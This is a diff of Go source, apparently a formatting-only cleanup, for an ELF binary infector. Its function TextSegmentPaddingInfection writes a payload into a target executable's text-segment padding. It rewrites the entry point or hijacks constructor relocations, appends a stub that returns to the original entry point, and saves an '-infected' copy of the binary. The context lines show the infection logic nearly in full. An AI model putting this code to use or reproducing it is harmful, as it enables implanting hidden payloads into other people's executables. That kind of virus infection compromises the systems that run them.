@@ -4,9 +4,9 @@ import (
 	"bytes"
 	"debug/elf"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"io/ioutil"
-	"errors"
 )
 
 const (
@@ -24,18 +24,16 @@ const (
 	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
 	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
 	ERROR_NO_TEXT_SEG               string = "[-] No text segment found in target binary possibly corrupted\n"
-
 )
-
 
 func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 	var textSegEnd interface{}
 	var oShoff interface{}
-	
+
 	textNdx := t.impNdx.textNdx
 
 	if textNdx == 0 {
-		return errors.New(ERROR_NO_TEXT_SEG)	
+		return errors.New(ERROR_NO_TEXT_SEG)
 	}
 
 	switch t.EIdent.Arch {
@@ -45,7 +43,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 
 		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog64)
-		
+
 		newEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
 
 		var origAddend int64
@@ -55,36 +53,33 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 			if err := t.relativeRelocHook(&origAddend, &relocEntry, int64(newEntry)); err != nil {
 				return err
 			}
-			
-		}else {
-			t.Hdr.(*elf.Header64).Entry = newEntry 
+
+		} else {
+			t.Hdr.(*elf.Header64).Entry = newEntry
 		}
 
-		
 		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
-	
 
 		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
-		
+
 		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
 		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint64))
 		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
-	
-		if !((opts & NoRest) == NoRest)  {
+
+		if !((opts & NoRest) == NoRest) {
 			t.Payload.Write(restoration64)
 		}
 
 		if !((opts & NoRetOEP) == NoRetOEP) {
 			var retStub []byte
 			if (opts & CtorsHijack) == CtorsHijack {
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), uint64(relocEntry.Addend), uint64(origAddend))
-			}else {
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
+				retStub = modEpilogue(int32(t.Payload.Len()+5), uint64(relocEntry.Addend), uint64(origAddend))
+			} else {
+				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
 			}
 			t.Payload.Write(retStub)
 		}
 
-		
 		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
 		if t.Debug {
 			printPayload(t.Payload.Bytes())
@@ -92,7 +87,6 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 
 		t.Phdrs.([]elf.Prog64)[textNdx].Memsz += uint64(t.Payload.Len())
 		t.Phdrs.([]elf.Prog64)[textNdx].Filesz += uint64(t.Payload.Len())
-
 
 		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
 		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
@@ -126,7 +120,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 
 		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog32)
-		
+
 		newEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
 
 		var origAddend uint32
@@ -136,34 +130,34 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 			if err := t.relativeRelocHook(&origAddend, &relocEntry, int32(newEntry)); err != nil {
 				return err
 			}
-			
-		}else {
+
+		} else {
 			t.Hdr.(*elf.Header32).Entry = newEntry
-		}	
-		
+		}
+
 		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
 
 		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
-		
+
 		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
 		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint32))
 		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
 
 		if !((opts & NoRest) == NoRest) {
-				t.Payload.Write(restoration32)
+			t.Payload.Write(restoration32)
 		}
-		
+
 		if !((opts & NoRetOEP) == NoRetOEP) {
 			var retStub []byte
 			if (opts & CtorsHijack) == CtorsHijack {
 				pEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), pEntry, uint32(origAddend))
-			}else {
-				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
+				retStub = modEpilogue(int32(t.Payload.Len()+5), pEntry, uint32(origAddend))
+			} else {
+				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header32).Entry, oEntry)
 			}
 			t.Payload.Write(retStub)
 		}
-		
+
 		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
 		if t.Debug {
 			printPayload(t.Payload.Bytes())
@@ -173,7 +167,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 		t.Phdrs.([]elf.Prog32)[textNdx].Filesz += uint32(t.Payload.Len())
 
 		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
-		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())	
+		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
 		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
 
 		for j := textNdx; j < len(pHeaders); j++ {
@@ -228,9 +222,9 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 	var ephdrsz int
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
-		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
 	case elf.ELFCLASS32:
-		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
+		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
 	}
 
 	infected.Write(t.Contents[ephdrsz:])
@@ -243,7 +237,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
 	}
 
-	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
+	finalInfectionTwo := make([]byte, infected.Len()+int(PAGE_SIZE))
 	finalInfection := infected.Bytes()
 
 	var endOfInfection int
@@ -261,7 +255,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
 	t.printDebugMsg("[+] writing payload into the binary")
 
 	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
-	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
+	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
 	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
